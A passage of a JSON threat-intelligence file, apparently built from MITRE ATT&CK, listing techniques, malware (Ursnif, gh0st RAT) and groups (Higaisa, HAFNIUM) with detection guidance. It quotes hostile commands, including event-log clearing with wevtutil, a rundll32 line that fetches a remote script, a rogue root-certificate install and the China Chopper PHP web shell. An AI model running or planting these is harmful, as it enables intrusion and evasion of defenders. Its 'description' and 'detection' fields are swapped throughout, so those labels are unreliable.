                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1559.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Component Object Model",
                "chain_phase": "execution",
                "description": "Monitor for COM objects loading DLLs and other modules not typically associated with the application.(Citation: Enigma Outlook DCOM Lateral Movement Nov 2017) Enumeration of COM objects, via [Query Registry](https://attack.mitre.org/techniques/T1012) or [PowerShell](https://attack.mitre.org/techniques/T1059/001), may also proceed malicious use.(Citation: Fireeye Hunting COM June 2019)(Citation: Enigma MMC20 COM Jan 2017)\n\nMonitor for spawning of processes associated with COM objects, especially those invoked by a user different than the one currently logged on. ",
                "detection": "Adversaries may use the Windows Component Object Model (COM) for local code execution. COM is an inter-process communication (IPC) component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces. Through COM, a client object can call methods of server objects, which are typically binary Dynamic Link Libraries (DLL) or executables (EXE).\n\nVarious COM interfaces are exposed that can be abused to invoke arbitrary execution via a variety of programming languages such as C, C++, Java, and Visual Basic. Specific COM objects also exist to directly perform functions beyond code execution, such as creating a Scheduled Task/Job, fileless download/execution, and other adversary behaviors related to privilege escalation and persistence.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1056.004",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Credential API Hooking",
                "chain_phase": "collection",
                "description": "Monitor for calls to the `SetWindowsHookEx` and `SetWinEventHook` functions, which install a hook procedure.(Citation: Microsoft Hook Overview)(Citation: Volatility Detecting Hooks Sept 2012) Also consider analyzing hook chains (which hold pointers to hook procedures for each type of hook) using tools(Citation: Volatility Detecting Hooks Sept 2012)(Citation: PreKageo Winhook Jul 2011)(Citation: Jay GetHooks Sept 2011) or by programmatically examining internal kernel structures.(Citation: Zairon Hooking Dec 2006)(Citation: EyeofRa Detecting Hooking June 2017)\n\nRootkits detectors(Citation: GMER Rootkits) can also be used to monitor for various types of hooking activity.\n\nVerify integrity of live processes by comparing code in memory to that of corresponding static binaries, specifically checking for jumps and other instructions that redirect code flow. Also consider taking snapshots of newly started processes(Citation: Microsoft Process Snapshot) to compare the in-memory IAT to the real addresses of the referenced functions.(Citation: StackExchange Hooks Jul 2012)(Citation: Adlice Software IAT Hooks Oct 2014)",
                "detection": "Adversaries may hook into Windows application programming interface (API) functions to collect user credentials. Malicious hooking mechanisms may capture API calls that include parameters that reveal user authentication credentials. Unlike Keylogging,  this technique focuses specifically on API functions that include parameters that reveal user credentials. Hooking involves redirecting calls to these functions and can be implemented via:\n\n* **Hooks procedures**, which intercept and execute designated code in response to events such as messages, keystrokes, and mouse inputs.\n* **Import address table (IAT) hooking**, which use modifications to a process’s IAT, where pointers to imported API functions are stored.\n* **Inline hooking**, which overwrites the first bytes in an API function to redirect code flow.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1036.005",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Match Legitimate Name or Location",
                "chain_phase": "defense-evasion",
                "description": "Collect file hashes; file names that do not match their expected hash are suspect. Perform file monitoring; files with known names but in unusual locations are suspect. Likewise, files that are modified outside of an update or patch are suspect.\n\nIf file names are mismatched between the file name on disk and that of the binary's PE metadata, this is a likely indicator that a binary was renamed after it was compiled. Collecting and comparing disk and resource filenames for binaries by looking to see if the InternalName, OriginalFilename, and/or ProductName match what is expected could provide useful leads, but may not always be indicative of malicious activity. (Citation: Elastic Masquerade Ball) Do not focus on the possible names a file could have, but instead on the command-line arguments that are known to be used and are distinct because it will have a better rate of detection.(Citation: Twitter ItsReallyNick Masquerading Update)\n\nIn containerized environments, use image IDs and layer hashes to compare images instead of relying only on their names.(Citation: Docker Images) Monitor for the unexpected creation of new resources within your cluster in Kubernetes, especially those created by atypical users.",
                "detection": "Adversaries may match or approximate the name or location of legitimate files or resources when naming/placing them. This is done for the sake of evading defenses and observation. This may be done by placing an executable in a commonly trusted directory (ex: under System32) or giving it the name of a legitimate, trusted program (ex: svchost.exe). In containerized environments, this may also be done by creating a resource in a namespace that matches the naming convention of a container pod or cluster. Alternatively, a file or container image name given may be a close approximation to legitimate programs/images or something innocuous.\n\nAdversaries may also use the same icon of the file they are trying to mimic.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows",
                    "Containers"
                ]
            }
        },
        {
            "id": "T1070.004",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "File Deletion",
                "chain_phase": "defense-evasion",
                "description": "It may be uncommon for events related to benign command-line functions such as DEL or third-party utilities or tools to be found in an environment, depending on the user base and how systems are typically used. Monitoring for command-line deletion functions to correlate with binaries or other files that an adversary may drop and remove may lead to detection of malicious activity. Another good practice is monitoring for known deletion and secure deletion tools that are not already on systems within an enterprise network that an adversary could introduce. Some monitoring tools may collect command-line arguments, but may not capture DEL commands since DEL is a native function within cmd.exe.",
                "detection": "Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\n\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples include native cmd functions such as DEL, secure deletion tools such as Windows Sysinternals SDelete, or other third-party file deletion tools.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1055.005",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Thread Local Storage",
                "chain_phase": "defense-evasion",
                "description": "Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>CreateRemoteThread</code>, <code>SuspendThread</code>/<code>SetThreadContext</code>/<code>ResumeThread</code>, and those that can be used to modify memory within another process, such as <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, may be used for this technique.(Citation: Elastic Process Injection July 2017)\n\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. ",
                "detection": "Adversaries may inject malicious code into processes via thread local storage (TLS) callbacks in order to evade process-based defenses as well as possibly elevate privileges. TLS callback injection is a method of executing arbitrary code in the address space of a separate live process. \n\nTLS callback injection involves manipulating pointers inside a portable executable (PE) to redirect a process to malicious code before reaching the code's legitimate entry point. TLS callbacks are normally used by the OS to setup and/or cleanup data used by threads. Manipulating TLS callbacks may be performed by allocating and writing to specific offsets within a process’ memory space using other Process Injection techniques such as Process Hollowing.\n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via TLS callback injection may also evade detection from security products since the execution is masked under a legitimate process.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1132",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Data Encoding",
                "chain_phase": "command-and-control",
                "description": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)",
                "detection": "Adversaries may encode data to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system. Use of data encoding may adhere to existing protocol specifications and includes use of ASCII, Unicode, Base64, MIME, or other binary-to-text and character encoding systems.  Some data encoding systems may also result in data compression, such as gzip.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1091",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Replication Through Removable Media",
                "chain_phase": "lateral-movement",
                "description": "Monitor file access on removable media. Detect processes that execute from removable media after it is mounted or when initiated by a user. If a remote access tool is used in this manner to move laterally, then additional actions are likely to occur after execution, such as opening network connections for Command and Control and system and network information Discovery.",
                "detection": "Adversaries may move onto systems, possibly those on disconnected or air-gapped networks, by copying malware to removable media and taking advantage of Autorun features when the media is inserted into a system and executes. In the case of Lateral Movement, this may occur through modification of executable files stored on removable media or by copying malware and renaming it to look like a legitimate file to trick users into executing it on a separate system. In the case of Initial Access, this may occur through manual manipulation of the media, modification of systems used to initially format the media, or modification to the media's firmware itself.",
                "is_subtype": false,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1090",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Proxy",
                "chain_phase": "command-and-control",
                "description": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server or between clients that should not or often do not communicate with one another). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)\n\nConsider monitoring for traffic to known anonymity networks (such as [Tor](https://attack.mitre.org/software/S0183)).",
                "detection": "Adversaries may use a connection proxy to direct network traffic between systems or act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including HTRAN, ZXProxy, and ZXPortMap.  Adversaries use these types of proxies to manage command and control communications, reduce the number of simultaneous outbound network connections, provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between victims to avoid suspicion. Adversaries may chain together multiple proxies to further disguise the source of malicious traffic.\n\nAdversaries can also take advantage of routing schemes in Content Delivery Networks (CDNs) to proxy command and control traffic.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows",
                    "Network"
                ]
            }
        },
        {
            "id": "T1080",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Taint Shared Content",
                "chain_phase": "lateral-movement",
                "description": "Processes that write or overwrite many files to a network shared directory may be suspicious. Monitor processes that are executed from removable media for malicious or abnormal activity such as network connections due to Command and Control and possible network Discovery techniques.\n\nFrequently scan shared network directories for malicious files, hidden files, .LNK files, and other file types that may not typical exist in directories used to share specific types of content.",
                "detection": "Adversaries may deliver payloads to remote systems by adding content to shared storage locations, such as network drives or internal code repositories. Content stored on network drives or in other shared locations may be tainted by adding malicious programs, scripts, or exploit code to otherwise valid files. Once a user opens the shared tainted content, the malicious portion can be executed to run the adversary's code on a remote system. Adversaries may use tainted shared content to move laterally.\n\nA directory share pivot is a variation on this technique that uses several other techniques to propagate malware when users access a shared network directory. It uses Shortcut Modification of directory .LNK files that use Masquerading to look like the real directories, which are hidden through Hidden Files and Directories. The malicious .LNK-based directories have an embedded command that executes the hidden malware file in the directory and then opens the real intended directory so that the user's expected action still occurs. When used with frequently used network directories, the technique may result in frequent reinfections and broad access to systems and potentially to new and higher privileged accounts. \n\nAdversaries may also compromise shared network directories through binary infections by appending or prepending its code to the healthy binary on the shared network directory. The malware may modify the original entry point (OEP) of the healthy binary to ensure that it is executed before the legitimate code. The infection could continue to spread via the newly infected file when it is executed by a remote system. These infections may target both binary and non-binary formats that end with extensions including, but not limited to, .EXE, .DLL, .SCR, .BAT, and/or .VBS.",
                "is_subtype": false,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1007",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "System Service Discovery",
                "chain_phase": "discovery",
                "description": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system information related to services. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
                "detection": "Adversaries may try to get information about registered services. Commands that may obtain information about services using operating system utilities are \"sc,\" \"tasklist /svc\" using Tasklist, and \"net start\" using Net, but adversaries may also use other tools as well. Adversaries may use the information from System Service Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
                "is_subtype": false,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "S0386",
            "type": "tool",
            "attributes": {
                "name": "Ursnif",
                "aliases": [
                    "Gozi-ISFB",
                    "PE_URSNIF",
                    "Dreambot"
                ],
                "labels": [
                    "malware"
                ],
                "description": "Ursnif is a banking trojan and variant of the Gozi malware observed being spread through various automated exploit kits, Spearphishing Attachments, and malicious links. Ursnif is associated primarily with data theft, but variants also include components (backdoors, spyware, file injectors, etc.) capable of a wide variety of behaviors.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1090.003": "Multi-hop Proxy",
                    "T1074.001": "Local Data Staging",
                    "T1564.003": "Hidden Window",
                    "T1568.002": "Domain Generation Algorithms",
                    "T1059.005": "Visual Basic",
                    "T1059.001": "PowerShell",
                    "T1497.003": "Time Based Evasion",
                    "T1559.001": "Component Object Model",
                    "T1056.004": "Credential API Hooking",
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1070.004": "File Deletion",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1543.003": "Windows Service",
                    "T1055.012": "Process Hollowing",
                    "T1055.005": "Thread Local Storage",
                    "T1185": "Man in the Browser",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1132": "Data Encoding",
                    "T1113": "Screen Capture",
                    "T1112": "Modify Registry",
                    "T1106": "Native API",
                    "T1105": "Ingress Tool Transfer",
                    "T1094": "Custom Command and Control Protocol",
                    "T1091": "Replication Through Removable Media",
                    "T1090": "Proxy",
                    "T1082": "System Information Discovery",
                    "T1080": "Taint Shared Content",
                    "T1057": "Process Discovery",
                    "T1047": "Windows Management Instrumentation",
                    "T1041": "Exfiltration Over C2 Channel",
                    "T1027": "Obfuscated Files or Information",
                    "T1012": "Query Registry",
                    "T1007": "System Service Discovery",
                    "T1005": "Data from Local System"
                }
            },
            "val": 35
        },
        {
            "id": "G0126",
            "type": "group",
            "attributes": {
                "val": 3,
                "name": "Higaisa",
                "aliases": [],
                "description": "Higaisa is a threat group suspected to have South Korean origins. Higaisa has targeted government, public, and trade organizations in North Korea; however, they have also carried out attacks in China, Japan, Russia, Poland, and other nations. Higaisa was first disclosed in early 2019 but is assessed to have operated as early as 2009.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0160": "certutil",
                    "S0032": "gh0st RAT",
                    "S0013": "PlugX"
                },
                "techniques": {
                    "T1059.007": "JavaScript",
                    "T1573.001": "Symmetric Cryptography",
                    "T1071.001": "Web Protocols",
                    "T1001.003": "Protocol Impersonation",
                    "T1090.001": "Internal Proxy",
                    "T1564.003": "Hidden Window",
                    "T1574.002": "DLL Side-Loading",
                    "T1204.002": "Malicious File",
                    "T1059.005": "Visual Basic",
                    "T1059.003": "Windows Command Shell",
                    "T1566.001": "Spearphishing Attachment",
                    "T1036.004": "Masquerade Task or Service",
                    "T1027.001": "Binary Padding",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1053.005": "Scheduled Task",
                    "T1220": "XSL Script Processing",
                    "T1203": "Exploitation for Client Execution",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1124": "System Time Discovery",
                    "T1106": "Native API",
                    "T1082": "System Information Discovery",
                    "T1057": "Process Discovery",
                    "T1041": "Exfiltration Over C2 Channel",
                    "T1029": "Scheduled Transfer",
                    "T1027": "Obfuscated Files or Information",
                    "T1016": "System Network Configuration Discovery"
                }
            }
        },
        {
            "id": "T1553.004",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Install Root Certificate",
                "chain_phase": "defense-evasion",
                "description": "A system's root certificates are unlikely to change frequently. Monitor new certificates installed on a system that could be due to malicious activity. (Citation: SpectorOps Code Signing Dec 2017) Check pre-installed certificates on new systems to ensure unnecessary or suspicious certificates are not present. Microsoft provides a list of trustworthy root certificates online and through authroot.stl. (Citation: SpectorOps Code Signing Dec 2017) The Sysinternals Sigcheck utility can also be used (<code>sigcheck[64].exe -tuv</code>) to dump the contents of the certificate store and list valid certificates not rooted to the Microsoft Certificate Trust List. (Citation: Microsoft Sigcheck May 2017)\n\nInstalled root certificates are located in the Registry under <code>HKLM\\SOFTWARE\\Microsoft\\EnterpriseCertificates\\Root\\Certificates\\</code> and <code>[HKLM or HKCU]\\Software[\\Policies\\]\\Microsoft\\SystemCertificates\\Root\\Certificates\\</code>. There are a subset of root certificates that are consistent across Windows systems and can be used for comparison: (Citation: Tripwire AppUNBlocker)\n\n* 18F7C1FCC3090203FD5BAA2F861A754976C8DD25\n* 245C97DF7514E7CF2DF8BE72AE957B9E04741E85\n* 3B1EFD3A66EA28B16697394703A72CA340A05BD5\n* 7F88CD7223F3C813818C994614A89C99FA3B5247\n* 8F43288AD272F3103B6FB1428485EA3014C0BCFE\n* A43489159A520F0D93D032CCAF37E7FE20A8B419\n* BE36A4562FB2EE05DBB3D32323ADF445084ED656\n* CDD4EEAE6000AC7F40C3802C171E30148030C072",
                "detection": "Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers. Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate.  Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website.\n\nInstallation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials. \n\nAtypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware/adware to provide a man-in-the-middle capability for intercepting information transmitted over secure TLS/SSL communications. \n\nRoot certificates (and their associated chains) can also be cloned and reinstalled. Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools (ex: Sysinternals, antivirus, etc.) used to block execution and/or uncover artifacts of Persistence. \n\nIn macOS, the Ay MaMi malware uses <code>/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert</code> to install a malicious certificate as a trusted root certificate into the system keychain.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "S0160",
            "type": "tool",
            "attributes": {
                "name": "certutil",
                "aliases": [
                    "certutil.exe"
                ],
                "labels": [
                    "tool"
                ],
                "description": "certutil is a command-line utility that can be used to obtain certificate authority information and configure Certificate Services.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1553.004": "Install Root Certificate",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1105": "Ingress Tool Transfer"
                }
            },
            "val": 3
        },
        {
            "id": "T1573",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Encrypted Channel",
                "chain_phase": "command-and-control",
                "description": "SSL/TLS inspection is one way of detecting command and control traffic within some encrypted communication channels.(Citation: SANS Decrypting SSL) SSL/TLS inspection does come with certain risks that should be considered before implementing to avoid potential security issues such as incomplete certificate validation.(Citation: SEI SSL Inspection Risks)\n\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)",
                "detection": "Adversaries may employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if secret keys are encoded and/or generated within malware samples/configuration files.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1568.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Fast Flux DNS",
                "chain_phase": "command-and-control",
                "description": "In general, detecting usage of fast flux DNS is difficult due to web traffic load balancing that services client requests quickly. In single flux cases only IP addresses change for static domain names. In double flux cases, nothing is static. Defenders such as domain registrars and service providers are likely in the best position for detection.",
                "detection": "Adversaries may use Fast Flux DNS to hide a command and control channel behind an array of rapidly changing IP addresses linked to a single domain resolution. This technique uses a fully qualified domain name, with multiple IP addresses assigned to it which are swapped with high frequency, using a combination of round robin IP addressing and short Time-To-Live (TTL) for a DNS resource record.\n\nThe simplest, \"single-flux\" method, involves registering and de-registering an addresses as part of the DNS A (address) record list for a single DNS name. These registrations have a five-minute average lifespan, resulting in a constant shuffle of IP address resolution.\n\nIn contrast, the \"double-flux\" method registers and de-registers an address as part of the DNS Name Server record list for the DNS zone, providing additional resilience for the connection. With double-flux additional hosts can act as a proxy to the C2 host, further insulating the true source of the C2 channel.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1070.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Clear Windows Event Logs",
                "chain_phase": "defense-evasion",
                "description": "Deleting Windows event logs (via native binaries (Citation: Microsoft wevtutil Oct 2017), API functions (Citation: Microsoft EventLog.Clear), or [PowerShell](https://attack.mitre.org/techniques/T1059/001) (Citation: Microsoft Clear-EventLog)) may also generate an alterable event (Event ID 1102: \"The audit log was cleared\").",
                "detection": "Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.\n\nThe event logs can be cleared with the following utility commands:\n\n* <code>wevtutil cl system</code>\n* <code>wevtutil cl application</code>\n* <code>wevtutil cl security</code>\n\nThese logs may also be cleared through other mechanisms, such as the event viewer GUI or PowerShell.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1218.011",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Rundll32",
                "chain_phase": "defense-evasion",
                "description": "Use process monitoring to monitor the execution and arguments of rundll32.exe. Compare recent invocations of rundll32.exe with prior history of known good arguments and loaded DLLs to determine anomalous and potentially adversarial activity. Command arguments used with the rundll32.exe invocation may also be useful in determining the origin and purpose of the DLL being loaded.",
                "detection": "Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. Shared Modules), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads.\n\nRundll32.exe can also be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. \n\nRundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https://www.example.com/malicious.sct\")\"</code>  This behavior has been seen used by malware such as Poweliks.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1129",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Shared Modules",
                "chain_phase": "execution",
                "description": "Monitoring DLL module loads may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances, since benign use of Windows modules load functions are common and may be difficult to distinguish from malicious behavior. Legitimate software will likely only need to load routine, bundled DLL modules or Windows system DLLs such that deviation from known module loads may be suspicious. Limiting DLL module loads to <code>%SystemRoot%</code> and <code>%ProgramFiles%</code> directories will protect against module loads from unsafe paths. \n\nCorrelation of other events with behavior surrounding module loads using API monitoring and suspicious DLLs written to disk will provide additional context to an event that may assist in determining if it is due to malicious behavior.",
                "detection": "Adversaries may abuse shared modules to execute malicious payloads. The Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality resides in NTDLL.dll and is part of the Windows Native API which is called from functions like <code>CreateProcess</code>, <code>LoadLibrary</code>, etc. of the Win32 API. \n\nThe module loader can load DLLs:\n\n* via specification of the (fully-qualified or relative) DLL pathname in the IMPORT directory;\n    \n* via EXPORT forwarded to another DLL, specified with (fully-qualified or relative) pathname (but without extension);\n    \n* via an NTFS junction or symlink program.exe.local with the fully-qualified or relative pathname of a directory containing the DLLs specified in the IMPORT directory or forwarded EXPORTs;\n    \n* via <code>&#x3c;file name=\"filename.extension\" loadFrom=\"fully-qualified or relative pathname\"&#x3e;</code> in an embedded or external \"application manifest\". The file name refers to an entry in the IMPORT directory or a forwarded EXPORT.\n\nAdversaries may use this functionality as a way to execute arbitrary code on a victim system. For example, malware may execute share modules to load additional components or features.",
                "is_subtype": false,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1059",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Command and Scripting Interpreter",
                "chain_phase": "execution",
                "description": "Command-line and scripting activities can be captured through proper logging of process execution with command-line arguments. This information can be useful in gaining additional insight to adversaries' actions through how they use native processes or custom tools. Also monitor for loading of modules associated with specific languages.\n\nIf scripting is restricted for normal users, then any attempt to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.\n\nScripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information discovery, collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script.",
                "detection": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of Unix Shell while Windows installations include the Windows Command Shell and PowerShell.\n\nThere are also cross-platform interpreters such as Python, as well as those commonly associated with client applications such as JavaScript and Visual Basic.\n\nAdversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in Initial Access payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows",
                    "Network"
                ]
            }
        },
        {
            "id": "S0032",
            "type": "tool",
            "attributes": {
                "name": "gh0st RAT",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "gh0st RAT is a remote access tool (RAT). The source code is public and it has been used by multiple groups.",
                "platforms": [
                    "Windows",
                    "macOS"
                ],
                "techniques": {
                    "T1573.001": "Symmetric Cryptography",
                    "T1573": "Encrypted Channel",
                    "T1132.001": "Standard Encoding",
                    "T1574.002": "DLL Side-Loading",
                    "T1568.001": "Fast Flux DNS",
                    "T1569.002": "Service Execution",
                    "T1056.001": "Keylogging",
                    "T1070.004": "File Deletion",
                    "T1070.001": "Clear Windows Event Logs",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1218.011": "Rundll32",
                    "T1543.003": "Windows Service",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1129": "Shared Modules",
                    "T1113": "Screen Capture",
                    "T1112": "Modify Registry",
                    "T1106": "Native API",
                    "T1105": "Ingress Tool Transfer",
                    "T1095": "Non-Application Layer Protocol",
                    "T1082": "System Information Discovery",
                    "T1059": "Command and Scripting Interpreter",
                    "T1057": "Process Discovery",
                    "T1055": "Process Injection",
                    "T1012": "Query Registry"
                }
            },
            "val": 24
        },
        {
            "id": "G0125",
            "type": "group",
            "attributes": {
                "val": 3,
                "name": "HAFNIUM",
                "aliases": [
                    "Operation Exchange Marauder"
                ],
                "description": "HAFNIUM is a likely state-sponsored cyber espionage group operating out of China that has been active since at least January 2021. HAFNIUM primarily targets entities in the US across a number of industry sectors, including infectious disease researchers, law firms, higher education institutions, defense contractors, policy think tanks, and NGOs.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0073": "ASPXSpy",
                    "S0029": "PsExec",
                    "S0020": "China Chopper"
                },
                "techniques": {
                    "T1592.004": "Client Configurations",
                    "T1590.005": "IP Addresses",
                    "T1590": "Gather Victim Network Information",
                    "T1589.002": "Email Addresses",
                    "T1583.006": "Web Services",
                    "T1583.003": "Virtual Private Server",
                    "T1071.001": "Web Protocols",
                    "T1132.001": "Standard Encoding",
                    "T1078.003": "Local Accounts",
                    "T1567.002": "Exfiltration to Cloud Storage",
                    "T1059.001": "PowerShell",
                    "T1560.001": "Archive via Utility",
                    "T1114.002": "Remote Email Collection",
                    "T1003.003": "NTDS",
                    "T1003.001": "LSASS Memory",
                    "T1136.002": "Domain Account",
                    "T1218.011": "Rundll32",
                    "T1505.003": "Web Shell",
                    "T1203": "Exploitation for Client Execution",
                    "T1105": "Ingress Tool Transfer",
                    "T1095": "Non-Application Layer Protocol"
                }
            }
        },
        {
            "id": "T1505.003",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Web Shell",
                "chain_phase": "persistence",
                "description": "Web shells can be difficult to detect. Unlike other forms of persistent remote access, they do not initiate connections. The portion of the Web shell that is on the server may be small and innocuous looking. The PHP version of the China Chopper Web shell, for example, is the following short payload: (Citation: Lee 2013) \n\n<code>&lt;?php @eval($_POST['password']);&gt;</code>\n\nNevertheless, detection mechanisms exist. Process monitoring may be used to detect Web servers that perform suspicious actions such as running cmd.exe or accessing files that are not in the Web directory. File monitoring may be used to detect changes to files in the Web directory of a Web server that do not match with updates to the Web server's content and may indicate implantation of a Web shell script. Log authentication attempts to the server and any unusual traffic patterns to or from the server and internal network. (Citation: US-CERT Alert TA15-314A Web Shells) ",
